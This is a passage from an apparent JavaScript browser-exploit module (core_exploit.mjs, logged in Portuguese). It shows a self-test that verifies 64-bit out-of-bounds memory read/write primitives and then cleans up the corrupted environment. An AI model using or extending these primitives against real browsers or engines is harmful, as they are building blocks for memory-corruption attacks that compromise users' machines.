        oob_write_absolute(next_offset, test_val64, 8);

        const read_val64 = oob_read_absolute(next_offset, 8);
        currentLog(`    (64bit Test) Lido de offset absoluto ${toHex(next_offset)}. Tipo retornado: ${typeof read_val64}.`, 'debug', FNAME_TEST);

        if (isAdvancedInt64Object(read_val64)) {
            currentLog(`    (64bit Test) Verificação local de tipo: OK. Valor lido (read_val64): ${toHexHelper(read_val64)}`, 'debug', FNAME_TEST);
            if (read_val64.low() === test_val64.low() && read_val64.high() === test_val64.high()) {
                currentLog(`    (64bit Test) SUCESSO: Lido ${toHexHelper(read_val64)} (low/high) corretamente.`, "good", FNAME_TEST);
                success64 = true;
            } else {
                currentLog(`    (64bit Test) FALHA: Componentes low/high não correspondem. Lido ${toHexHelper(read_val64)}, Esperado ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
                currentLog(`        Lido  : low=0x${read_val64.low().toString(16)}, high=0x${read_val64.high().toString(16)}`, "error", FNAME_TEST);
                currentLog(`        Esperado: low=0x${test_val64.low().toString(16)}, high=0x${test_val64.high().toString(16)}`, "error", FNAME_TEST);
            }
        } else {
            currentLog(`    (64bit Test) FALHA: Valor lido NÃO é reconhecido como um objeto AdvancedInt64 pela verificação local. Construtor: ${read_val64?.constructor?.name}. Valor: ${String(read_val64)} Esperado: ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
        }

        currentLog(`--- Auto-Teste de OOB R/W Concluído (32bit: ${success32}, 64bit: ${success64}) ---`, 'test', FNAME_TEST);
        return success32 && success64;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        console.error(`[${FNAME_TEST}] Exception: `, e);
        isOOBEnvironmentSetup = false;
        return false;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        currentLog(`    (Cleanup) Ambiente OOB limpo após self-test.`, 'info', FNAME_TEST);
    }
}
// END OF core_exploit.mjs

// --- AQUI DEVE ESTAR testArrayBufferVictimCrash.mjs (continuação) ---
